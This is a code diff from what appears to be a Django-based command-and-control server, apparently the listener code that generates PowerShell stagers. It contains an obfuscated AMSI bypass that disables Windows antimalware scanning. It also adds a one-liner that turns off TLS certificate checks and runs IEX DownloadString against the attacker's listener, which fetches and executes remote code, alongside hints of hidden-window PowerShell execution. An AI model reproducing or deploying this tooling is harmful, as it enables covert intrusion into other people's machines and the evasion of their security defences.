@@ -119,7 +119,8 @@ class Listener():
                 listener.ip = ip
                 listener.save()
             amsi= '$apple=[Ref].Assembly.GetTypes();ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}};$dogwater=$cherry.GetFields(\'NonPublic,Static\');ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}};$foxhole.SetValue($null,$true);'
-            oneliner = "{} IEX(New-Object Net.WebClient).DownloadString(\'https://{}:{}/sc/{}\')".format(amsi,ip, str(port), eth)
+            # -ExecutionPolicy unrestricted -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object Net.WebClient).DownloadString(\"127.0.0.1/xxx\")" 
+            oneliner = "{} [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ; IEX(New-Object Net.WebClient).DownloadString(\'https://{}:{}/sc/{}\')".format(amsi,ip, str(port), eth)
             return JsonResponse({"payload" : oneliner} , status=200)
 
 #powershell.exe -nop -w hidden -c 
@@ -254,24 +255,6 @@ class Listener():
             else:
                 return HttpResponse('')
 
-
-
-#Imaginary function to handle an uploaded file. ########################                                           
-def handle_uploaded_file(f):
-    with open('uploaded', 'wb+') as destination:
-        for chunk in f.chunks():
-            destination.write(chunk)
-
-
-def upload_file(request):
-    if request.method == 'POST':
-        form = UploadFileForm(request.POST, request.FILES)
-        if form.is_valid():
-            handle_uploaded_file(request.FILES['file'])
-            return HttpResponseRedirect('../homePage')
-    else:
-        form = UploadFileForm()
-    return render(request, 'blog/upload.html', {'form': form})
 
 #########################################################################
 
